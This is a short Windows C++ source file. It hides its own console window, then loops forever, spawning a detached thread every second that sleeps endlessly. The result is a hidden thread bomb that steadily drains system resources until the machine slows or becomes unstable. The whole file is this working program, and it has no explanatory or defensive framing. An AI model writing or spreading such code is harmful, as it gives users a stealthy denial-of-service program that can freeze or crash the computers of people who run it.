#include <bits/stdc++.h>
#include <windows.h>
// #include <dir.h>
#include <conio.h>
#include <sys/stat.h>
#include <shlwapi.h>
#include <thread>
#include <dirent.h>
#include <vector>
#include <cstring>
#pragma comment(lib, "Shlwapi.lib")
using namespace std;
inline bool exists(const string name)
{
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}
WINBOOL HideConsole()
{
	HWND hwndc = GetConsoleWindow();
	return ShowWindow(hwndc, SW_HIDE);
}
void w()
{
	while (1)
		sleep(50);
}
int main()
{
	// system("wmic process where \"name='notepad.exe'\" call setpriority 128");
	HideConsole();
	while (1)
	{
		thread s(w);
		sleep(1);
		s.detach();
	}
	return 0;
}